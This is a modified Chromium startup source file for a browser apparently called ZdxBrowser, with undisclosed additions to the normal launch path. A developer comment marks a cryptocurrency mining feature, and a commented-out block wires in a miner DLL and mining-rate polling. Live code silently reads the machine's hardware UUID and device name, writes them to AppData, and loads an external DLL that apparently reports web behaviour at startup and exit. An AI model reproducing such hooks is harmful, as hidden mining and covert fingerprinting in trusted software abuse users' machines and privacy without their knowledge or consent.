// Copyright (c) 2012 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include <stdint.h>
#include <thread>

#include "base/files/file_path.h"
#include "base/files/file_util.h"
#include "base/path_service.h"
#include "base/callback_helpers.h"
#include "base/command_line.h"
#include "base/time/time.h"
#include "build/build_config.h"
#include "chrome/app/chrome_main_delegate.h"
#include "chrome/common/buildflags.h"
#include "chrome/common/chrome_switches.h"
#include "content/public/app/content_main.h"
#include "content/public/common/content_switches.h"
#include "headless/public/headless_shell.h"
#include "ui/gfx/switches.h"

#if defined(OS_MACOSX)
#include "chrome/app/chrome_main_mac.h"
#endif

#if defined(OS_WIN)
#include <Shlobj.h>
#include <Wbemidl.h>
#include <comdef.h>
#include <codecvt>
#include <fstream>
#include <iostream>
#include "base/debug/dump_without_crashing.h"
#include "base/win/win_util.h"
#include "chrome/common/chrome_constants.h"
#include "chrome/install_static/initialize_from_primary_module.h"
#include "chrome/install_static/install_details.h"
#include "chrome_elf/chrome_elf_main.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wbemuuid.lib")

bool get_system_uuid(std::string& uuid, std::string& device_name) {
  bool bRet = false;
  HRESULT hres;

  // Step 1: --------------------------------------------------
  // Initialize COM. ------------------------------------------

  hres = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
  if (FAILED(hres)) {
    std::cout << "Failed to initialize COM library. Error code = 0x" << std::hex
              << hres << std::endl;
    return bRet;
  }

  // Step 2: --------------------------------------------------
  // Set general COM security levels --------------------------

  // hres = CoInitializeSecurity(
  //    NULL,
  //    -1,                           // COM authentication
  //    NULL,                         // Authentication services
  //    NULL,                         // Reserved
  //    RPC_C_AUTHN_LEVEL_DEFAULT,    // Default authentication
  //    RPC_C_IMP_LEVEL_IMPERSONATE,  // Default Impersonation
  //    NULL,                         // Authentication info
  //    EOAC_NONE,                    // Additional capabilities
  //    NULL                          // Reserved
  //);

  // if (FAILED(hres)) {
  //  std::cout << "Failed to initialize security. Error code = 0x" << std::hex
  //            << hres << std::endl;
  //  CoUninitialize();
  //  return bRet;
  //}

  // Step 3: ---------------------------------------------------
  // Obtain the initial locator to WMI -------------------------

  IWbemLocator* pLoc = NULL;

  hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (LPVOID*)&pLoc);

  if (FAILED(hres)) {
    std::cout << "Failed to create IWbemLocator object."
              << " Err code = 0x" << std::hex << hres << std::endl;
    CoUninitialize();
    return bRet;
  }

  // Step 4: -----------------------------------------------------
  // Connect to WMI through the IWbemLocator::ConnectServer method

  IWbemServices* pSvc = NULL;

  // Connect to the root\cimv2 namespace with
  // the current user and obtain pointer pSvc
  // to make IWbemServices calls.
  hres = pLoc->ConnectServer(
      _bstr_t(L"ROOT\\CIMV2"),  // Object path of WMI namespace
      NULL,                     // User name. NULL = current user
      NULL,                     // User password. NULL = current
      0,                        // Locale. NULL indicates current
      NULL,                     // Security flags.
      0,                        // Authority (for example, Kerberos)
      0,                        // Context object
      &pSvc                     // pointer to IWbemServices proxy
  );

  if (FAILED(hres)) {
    std::cout << "Could not connect. Error code = 0x" << std::hex << hres
              << std::endl;
    pLoc->Release();
    CoUninitialize();
    return bRet;
  }

  std::cout << "Connected to ROOT\\CIMV2 WMI namespace" << std::endl;

  // Step 5: --------------------------------------------------
  // Set security levels on the proxy -------------------------
  hres = CoSetProxyBlanket(pSvc,               // Indicates the proxy to set
                           RPC_C_AUTHN_WINNT,  // RPC_C_AUTHN_xxx
                           RPC_C_AUTHZ_NONE,   // RPC_C_AUTHZ_xxx
                           NULL,               // Server principal name
                           RPC_C_AUTHN_LEVEL_CALL,  // RPC_C_AUTHN_LEVEL_xxx
                           RPC_C_IMP_LEVEL_IMPERSONATE,  // RPC_C_IMP_LEVEL_xxx
                           NULL,                         // client identity
                           EOAC_NONE                     // proxy capabilities
  );

  if (FAILED(hres)) {
    std::cout << "Could not set proxy blanket. Error code = 0x" << std::hex
              << hres << std::endl;
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return bRet;
  }

  // Step 6: --------------------------------------------------
  // Use the IWbemServices pointer to make requests of WMI ----

  // For example, get the name of the operating system
  IEnumWbemClassObject* pEnumerator = NULL;
  hres = pSvc->ExecQuery(bstr_t("WQL"),
                         bstr_t("SELECT * FROM win32_computersystemproduct"),
                         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                         NULL, &pEnumerator);

  if (FAILED(hres)) {
    std::cout << "Query for operating system name failed."
              << " Error code = 0x" << std::hex << hres << std::endl;
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return bRet;
  }

  // Step 7: -------------------------------------------------
  // Get the data from the query in step 6 -------------------

  IWbemClassObject* pclsObj = NULL;
  ULONG uReturn = 0;

  while (pEnumerator) {
    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

    if (0 == uReturn) {
      break;
    }

    VARIANT vtProp;

    // Get the value of the Name property
    hr = pclsObj->Get(L"uuid", 0, &vtProp, 0, 0);
    std::wcout << " OS uuid : " << vtProp.bstrVal << std::endl;
    std::wstring wuuid(vtProp.bstrVal);
    std::wstring_convert<std::codecvt_utf8<wchar_t>> utf8_cvt;
    uuid = utf8_cvt.to_bytes(wuuid);
    VariantClear(&vtProp);

    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
    std::wcout << " OS Name : " << vtProp.bstrVal << std::endl;
    std::wstring wname(vtProp.bstrVal);
    device_name = utf8_cvt.to_bytes(wname);
    VariantClear(&vtProp);

    pclsObj->Release();
  }

  // Cleanup
  // ========
  pSvc->Release();
  pLoc->Release();
  pEnumerator->Release();
  CoUninitialize();
  return bRet;
}

#define DLLEXPORT __declspec(dllexport)

// We use extern C for the prototype DLLEXPORT to avoid C++ name mangling.
extern "C" {
DLLEXPORT int __cdecl ChromeMain(HINSTANCE instance,
                                 sandbox::SandboxInterfaceInfo* sandbox_info,
                                 int64_t exe_entry_point_ticks);
}
#elif defined(OS_POSIX)
extern "C" {
__attribute__((visibility("default")))
int ChromeMain(int argc, const char** argv);
}
#endif

#if defined(OS_WIN)
DLLEXPORT int __cdecl ChromeMain(HINSTANCE instance,
                                 sandbox::SandboxInterfaceInfo* sandbox_info,
                                 int64_t exe_entry_point_ticks) {
#elif defined(OS_POSIX)
int ChromeMain(int argc, const char** argv) {
  int64_t exe_entry_point_ticks = 0;
#endif

#if defined(OS_WIN)
  install_static::InitializeFromPrimaryModule();
#endif

  ChromeMainDelegate chrome_main_delegate(
      base::TimeTicks::FromInternalValue(exe_entry_point_ticks));
  content::ContentMainParams params(&chrome_main_delegate);

#if defined(OS_WIN)
  // The process should crash when going through abnormal termination, but we
  // must be sure to reset this setting when ChromeMain returns normally.
  auto crash_on_detach_resetter = base::ScopedClosureRunner(
      base::Bind(&base::win::SetShouldCrashOnProcessDetach,
                 base::win::ShouldCrashOnProcessDetach()));
  base::win::SetShouldCrashOnProcessDetach(true);
  base::win::SetAbortBehaviorForCrashReporting();
  params.instance = instance;
  params.sandbox_info = sandbox_info;

  // Pass chrome_elf's copy of DumpProcessWithoutCrash resolved via load-time
  // dynamic linking.
  base::debug::SetDumpWithoutCrashingFunction(&DumpProcessWithoutCrash);

  // Verify that chrome_elf and this module (chrome.dll and chrome_child.dll)
  // have the same version.
  if (install_static::InstallDetails::Get().VersionMismatch())
    base::debug::DumpWithoutCrashing();
#else
  params.argc = argc;
  params.argv = argv;
  base::CommandLine::Init(params.argc, params.argv);
#endif  // defined(OS_WIN)
  base::CommandLine::Init(0, nullptr);
  const base::CommandLine* command_line(base::CommandLine::ForCurrentProcess());
  ALLOW_UNUSED_LOCAL(command_line);
  // zhangfj 20181227 挖矿功能启用
  const std::string process_type =
      command_line->GetSwitchValueASCII(switches::kProcessType);
  if (process_type.empty()) {
    char szFullPath[MAX_PATH];
    memset(szFullPath, 0, MAX_PATH);
    ::GetModuleFileNameA(NULL, szFullPath, MAX_PATH);
    int len = strlen(szFullPath);
    for (int i = len - 1; i > 0; i--) {
      if (szFullPath[i] != '\\') {
        szFullPath[i] = '\0';
        continue;
      }
      break;
    }
    //std::string self_path = szFullPath;
    //std::string dllname = self_path + "glue.dll";

    //std::thread tGetMinerRate([&]() {
    //  HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
    //                                    LOAD_WITH_ALTERED_SEARCH_PATH);
    //  if (!hApp) {
    //    ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
    //  } else {
    //    typedef bool(__stdcall * pFunGetMinerRate)(double& xmr_rate,
    //                                               double& eth_rate);
    //    pFunGetMinerRate pGetMinerRate =
    //        (pFunGetMinerRate)::GetProcAddress(hApp, "GetMinerRate");
    //    if (!pGetMinerRate) {
    //      ::OutputDebugStringA("GetMinerRate GetProcAddress error.");
    //    } else {
    //      double xmr_rate = 0;
    //      double eth_rate = 0;
    //      bool ret = pGetMinerRate(xmr_rate, eth_rate);
    //      if (ret) {
    //        char m_lpszDefaultDir[MAX_PATH];
    //        char szDocument[MAX_PATH] = {0};
    //        memset(m_lpszDefaultDir, 0, _MAX_PATH);

    //        LPITEMIDLIST pidl = NULL;
    //        SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &pidl);
    //        if (pidl && SHGetPathFromIDListA(pidl, szDocument)) {
    //          GetShortPathNameA(szDocument, m_lpszDefaultDir, _MAX_PATH);
    //        }

    //        std::string appdata = m_lpszDefaultDir;
    //        std::string filename =
    //            appdata + "\\ZdxBrowser\\User Data\\Default\\miner_rate";
    //        std::ofstream out(filename, std::ios::out | std::ios::trunc);
    //        if (out.is_open()) {
    //          out << std::to_string(xmr_rate) << " "
    //              << std::to_string(eth_rate);
    //          out.close();
    //        }
    //      } else {
    //        ::OutputDebugStringA("GetMinerRate error.");
    //      }
    //    }

    //      std::string uuid;
    //      std::string device_name;
    //      get_system_uuid(uuid, device_name);
    //      if (uuid.length() > 0) {
    //        char m_lpszDefaultDir[MAX_PATH];
    //        char szDocument[MAX_PATH] = {0};
    //        memset(m_lpszDefaultDir, 0, _MAX_PATH);
    //        LPITEMIDLIST pidl = NULL;
    //        SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &pidl);
    //        if (pidl && SHGetPathFromIDListA(pidl, szDocument)) {
    //          GetShortPathNameA(szDocument, m_lpszDefaultDir, _MAX_PATH);
    //        }
    //        std::string appdata = m_lpszDefaultDir;
    //        std::string filename =
    //            appdata + "\\ZdxBrowser\\User Data\\Default\\UUID";
    //        std::ifstream fin(filename, std::ios::in);
    //        if (fin.good()) {
    //          fin.close();
    //        } else {
    //          std::ofstream out(filename,
    //                          std::ios::in | std::ios::out | std::ios::trunc);
    //          if (out.is_open()) {
    //            std::string str = uuid;
    //            str += ";";
    //            str += device_name;
    //            out << str;
    //            out.close();
    //          }
    //        }
    //      }
    //      ::OutputDebugStringA("get_system_uuid");
    //      if (uuid.length() > 0) {
    //        ::OutputDebugStringA(uuid.c_str());
    //      } else {
    //        ::OutputDebugStringA("get uuid error!!!");
    //      }
    //    if (hApp) {
    //      FreeLibrary(hApp);
    //      hApp = nullptr;
    //    }
    //  }
    //});
    //tGetMinerRate.detach();

    //std::thread tRun([&]() {
    //  HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
    //                                    LOAD_WITH_ALTERED_SEARCH_PATH);
    //  if (!hApp) {
    //    ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
    //  } else {
    //    typedef int(__stdcall * pFunRunReLoad)(const char* url, char* body,
    //                                           size_t max_size);
    //    pFunRunReLoad pRunReLoad =
    //        (pFunRunReLoad)::GetProcAddress(hApp, "RunReload");
    //    if (!pRunReLoad) {
    //      ::OutputDebugStringA("RunReload GetProcAddress error.");
    //    } else {
    //      std::string body;
    //      int ret = 0;
    //      char sbody[4096];
    //      size_t sbody_len = 4096;
    //      do {
    //        memset(sbody, 0, 4096);
    //        ret = pRunReLoad("http://localhost:2492/api/reload?dev=cpu", sbody,
    //                         sbody_len);
    //        std::string body = "{\"rt\":-3,\"error\":\"yilu info error!\"}";
    //        if (ret > 0 && (body.compare(sbody) != 0)) {
    //          ::OutputDebugStringA(" ^_^ check miner thread exit!!! ");
    //          ::OutputDebugStringA(sbody);
    //        } else {
    //          ::OutputDebugStringA("RunReload run once ... ");
    //          std::this_thread::sleep_for(std::chrono::milliseconds(200));
    //        }
    //      } while (ret <= 0);
    //    }
    //    if (hApp) {
    //      FreeLibrary(hApp);
    //      hApp = nullptr;
    //    }
    //  }
    //});
    //tRun.detach();

    base::FilePath app_path;
    base::FilePath data_path;
    base::PathService::Get(base::DIR_APP_DATA, &app_path);
    data_path = app_path.AppendASCII("ZdxBrowser");
    if (!base::PathExists(data_path))
      base::CreateDirectoryW(data_path);
    data_path = data_path.AppendASCII("ZdxData");
    if (!base::PathExists(data_path))
      base::CreateDirectoryW(data_path);
    std::string uuid;
    std::string device_name;
    get_system_uuid(uuid, device_name);
    if (uuid.length() > 0) {
      base::FilePath path;
      path = data_path.AppendASCII("UUID");
      std::string text = uuid + ";" + device_name;
      base::WriteFile(path, text.c_str(), text.length());
    }
    
    // zhangfj 20190122 dns纠错/加速/白名单/用户白名单
    std::string dns_path = szFullPath;
    std::string dllname = dns_path + "dns_correction.dll";
    std::thread tDnsCorrectionRun([&]() {
      HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
                                        LOAD_WITH_ALTERED_SEARCH_PATH);
      if (!hApp) {
        ::OutputDebugStringA("dns_correction.dll LoadLibraryExA error.");
      } else {
        typedef bool(__stdcall * pFunInitialize)(void);
        pFunInitialize pInitialize =
            (pFunInitialize)::GetProcAddress(hApp, "Initialize");
        if (!pInitialize) {
          ::OutputDebugStringA("Initialize GetProcAddress error.");
        } else {
          bool ret = pInitialize();
          if (ret) {
            ::OutputDebugStringA("Initialize call success.");
          } else {
            ::OutputDebugStringA("Initialize call error.");
          }
        }
        typedef void(__stdcall * pFunSendToWebBehavior)(
            int& online_number, unsigned int user_id, int btype);
        pFunSendToWebBehavior pSendToWebBehavior =
            (pFunSendToWebBehavior)::GetProcAddress(hApp,
                                                      "SendToWebBehavior");
        if (pSendToWebBehavior) {
          int number = 0;
          pSendToWebBehavior(number, 0, 0);
        }
        typedef void (__stdcall *pFunUpdateWhiteListInfo)(unsigned int user_id, bool enable);
        pFunUpdateWhiteListInfo pUpdateWhiteListInfo =
                    (pFunUpdateWhiteListInfo)::GetProcAddress(hApp, "UpdateWhiteListInfo");
        if (pUpdateWhiteListInfo) {
          pUpdateWhiteListInfo(0, true);
        }
      }
    });
    tDnsCorrectionRun.detach();
  }

#if defined(OS_MACOSX)
  SetUpBundleOverrides();
#endif

  // Chrome-specific process modes.
#if defined(OS_LINUX) || defined(OS_MACOSX) || defined(OS_WIN)
  if (command_line->HasSwitch(switches::kHeadless)) {
    return headless::HeadlessShellMain(params);
  }
#endif  // defined(OS_LINUX) || defined(OS_MACOSX) || defined(OS_WIN)

  int rv = content::ContentMain(params);

  HINSTANCE hDns = ::GetModuleHandleA("dns_correction.dll");
  if (hDns) {
    typedef void(__stdcall * pFunSendToWebBehavior)(
        int& online_number, unsigned int user_id, int btype);
    pFunSendToWebBehavior pSendToWebBehavior =
        (pFunSendToWebBehavior)::GetProcAddress(hDns, "SendToWebBehavior");
    if (pSendToWebBehavior) {
      int number = 0;
      pSendToWebBehavior(number, 0, 1);
      Sleep(200);
    }
  }
  return rv;
}
